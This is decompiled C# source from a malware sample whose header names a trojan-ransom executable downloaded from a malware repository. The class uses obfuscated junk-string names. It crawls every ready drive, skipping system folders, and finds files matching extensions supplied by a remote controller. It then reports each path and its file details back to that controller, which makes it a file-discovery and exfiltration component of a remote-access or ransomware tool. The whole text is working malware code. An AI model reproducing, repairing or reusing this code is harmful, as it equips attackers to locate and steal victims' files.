// Decompiled with JetBrains decompiler
// Type: zthjxratbens.PCIRPIVF
// Assembly: zthjxratbens, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E4928766-6934-4945-9130-5EB266E8CD1B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.05\HEUR-Trojan-Ransom.MSIL.Foreign.gen-33efd821e2484eda83e99247859286a78c16be9deea18bc1e563ad91cb789ea5.exe

using System;
using System.Collections.Generic;
using System.IO;

namespace zthjxratbens
{
  internal class PCIRPIVF
  {
    public int zthjxratbenssInrdx;
    public List<string> zthjxratbensnotFilrders = new List<string>();
    public List<string> zthjxratbenssFilyes = new List<string>();
    public int zthjxratbensfInudx;
    public List<string> zthjxratbensfExits = new List<string>();
    public bool zthjxratbensreuaging;
    public MAICMD iservyer;

    public PCIRPIVF()
    {
      this.zthjxratbensnotFilrders.Add("windows|zthjxratbens".Split('|')[0]);
      this.zthjxratbensnotFilrders.Add("program files (x86)|zthjxratbens".Split('|')[0]);
      this.zthjxratbensnotFilrders.Add("program files|zthjxratbens".Split('|')[0]);
      this.zthjxratbensnotFilrders.Add("system volume information|zthjxratbens".Split('|')[0]);
    }

    public string zthjxratbenscheck_Falder(string path)
    {
      string str = "";
      if (Directory.Exists(path))
      {
        foreach (string directory in Directory.GetDirectories(path))
        {
          if (this.zthjxratbensseie_Acdess(directory))
            str = str + directory + ">|zthjxratbens".Split('|')[0];
        }
      }
      return str;
    }

    public IEnumerable<string> zthjxratbens_addrFile(string path)
    {
      Queue<string> moreFiles = new Queue<string>();
      moreFiles.Enqueue(path);
      while (moreFiles.Count > 0 && !this.iservyer.zthjxratbensautCdnls)
      {
        path = moreFiles.Dequeue();
        try
        {
          foreach (string directory in Directory.GetDirectories(path))
          {
            if (this.zthjxratbensseie_Acdess(directory) && !this.zthjxratbensnotFilrders.Contains(directory.ToLower()))
              moreFiles.Enqueue(directory);
          }
        }
        catch
        {
        }
        string[] files = Directory.GetFiles(path);
        if (files != null)
        {
          for (int i = 0; i < files.Length; ++i)
            yield return files[i];
        }
      }
    }

    public void zthjxratbensloiok_Filde(string tempStr)
    {
      this.iservyer.zthjxratbensautCdnls = false;
      this.zthjxratbensfExits.Clear();
      this.zthjxratbenssFilyes.Clear();
      this.zthjxratbensfInudx = 0;
      this.zthjxratbenssInrdx = 0;
      string[] strArray = tempStr.Split('<');
      if (strArray.Length <= 1)
        return;
      string str1 = strArray[0];
      char[] chArray = new char[1]{ '>' };
      foreach (string str2 in str1.Split(chArray))
      {
        if (str2 != "")
          this.zthjxratbensfExits.Add(str2);
      }
      if (strArray[1] != "")
      {
        this.zthjxratbensreuaging = true;
        this.zthjxratbensseind_Srrch(strArray[1]);
        this.zthjxratbensreuaging = false;
        this.iservyer.zthjxratbenspuish_dtdta((byte[]) null, "zthjxratbens-seiard=seading!zthjxratbens".Split('!')[0]);
      }
      else
      {
        DriveInfo[] drives = DriveInfo.GetDrives();
        this.zthjxratbensreuaging = true;
        foreach (DriveInfo driveInfo in drives)
        {
          if (driveInfo.IsReady)
            this.zthjxratbensseind_Srrch(driveInfo.Name);
        }
        this.iservyer.zthjxratbenspuish_dtdta((byte[]) null, "zthjxratbens-seiard=sedhing!zthjxratbens".Split('!')[0]);
        this.zthjxratbensreuaging = false;
      }
    }

    public void zthjxratbensseind_Srrch(string path)
    {
      try
      {
        foreach (string path1 in this.zthjxratbens_addrFile(path))
        {
          if (this.zthjxratbensfExits.Contains(Path.GetExtension(path1).ToLower()))
          {
            string str = this.iservyer.zthjxratbensfiile_info(path1, true);
            this.iservyer.zthjxratbenspuish_dtdta((byte[]) null, "zthjxratbens-seiarf=!zthjxratbens".Split('!')[0] + path1 + "<FIiLE_AUiTO<!zthjxratbens".Split('!')[0] + str);
          }
          if (this.iservyer.zthjxratbensautCdnls)
            break;
        }
      }
      catch
      {
      }
    }

    public bool zthjxratbensseie_Acdess(string fPath)
    {
      DirectoryInfo directoryInfo = new DirectoryInfo(fPath);
      try
      {
        directoryInfo.GetDirectories();
        return true;
      }
      catch (Exception ex)
      {
        return false;
      }
    }

    public string zthjxratbensloiokup_Fres(string path)
    {
      string str = "";
      if (Directory.Exists(path))
      {
        foreach (string file in Directory.GetFiles(path))
          str = str + file + ">|zthjxratbens".Split('|')[0];
      }
      else
        str = (string) null;
      return str;
    }

    public string zthjxratbensloiokup_Drives()
    {
      string str = "";
      foreach (DriveInfo drive in DriveInfo.GetDrives())
      {
        if (drive.IsReady)
          str = str + drive.Name + ">!zthjxratbens".Split('!')[0];
      }
      return str;
    }
  }
}
